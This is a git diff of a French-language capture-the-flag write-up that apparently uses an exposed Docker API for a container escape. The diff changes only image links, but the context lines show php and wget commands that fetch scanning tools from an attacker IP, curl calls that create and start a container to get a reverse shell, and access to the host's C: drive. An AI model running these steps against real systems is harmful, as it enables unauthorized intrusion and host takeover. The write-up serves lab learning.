@@ -62,9 +62,9 @@ https://raw.githubusercontent.com/andrew-d/static-binaries/master/binaries/linux
 php -r "copy('http://10.10.14.116:8080/nmap.1', '/tmp/nmap');"
 php -r "copy('http://10.10.14.116:8000/fscan.1', '/tmp/fscan');"
 
-![[IMG-20251210100332706.png]]
+![[IMG-20251210101501891.png]]
 wget https://github.com/shadow1ng/fscan/releases/download/1.8.4/fscan
-![[IMG-20251210100333027.png]]
+![[IMG-20251210101501946.png]]
 
 ## 2. Étape 1 : Énumération des images Docker
 L’API permet d’identifier les images disponibles sur l’hôte :
@@ -73,7 +73,7 @@ L’API permet d’identifier les images disponibles sur l’hôte :
 curl -s http://192.168.65.7:2375/images/json
 ```
 
-![[IMG-20251210100333786.png]]
+![[IMG-20251210101502193.png]]
 Cela révèle une image telle que :
 
 ```
@@ -97,14 +97,14 @@ Exemple de fichier `create_container.json` :
 }
 ```
 
-![[IMG-20251210100333335.png]]
+![[IMG-20251210101502056.png]]
 Exécution :
 
 ```
 curl -H "Content-Type: application/json"      -d @create_container.json      http://192.168.65.7:2375/containers/create -o response.json
 ```
 
-![[IMG-20251210100333492.png]]
+![[IMG-20251210101502092.png]]
 
 Le résultat contient un champ `"Id"` correspondant au nouvel identifiant du conteneur.
 
@@ -116,7 +116,7 @@ Le résultat contient un champ `"Id"` correspondant au nouvel identifiant du con
 ```
 curl -X POST http://192.168.65.7:2375/containers/$cid/start
 ```
-![[IMG-20251210100333595.png]]
+![[IMG-20251210101502129.png]]
 
 Un reverse shell est alors établi vers la machine de l’attaquant.
 
@@ -136,8 +136,8 @@ le conteneur possède un accès direct au disque C: de Windows dans :
 ```
 
 On peut alors naviguer dans les fichiers utilisateurs ou administrateurs.
-![[IMG-20251210100333657.png]]
-![[IMG-20251210100333198.png]]
+![[IMG-20251210101502168.png]]
+![[IMG-20251210101502016.png]]
 Cela permet de récupérer le flag ou prendre le contrôle complet du système.
 
 ---
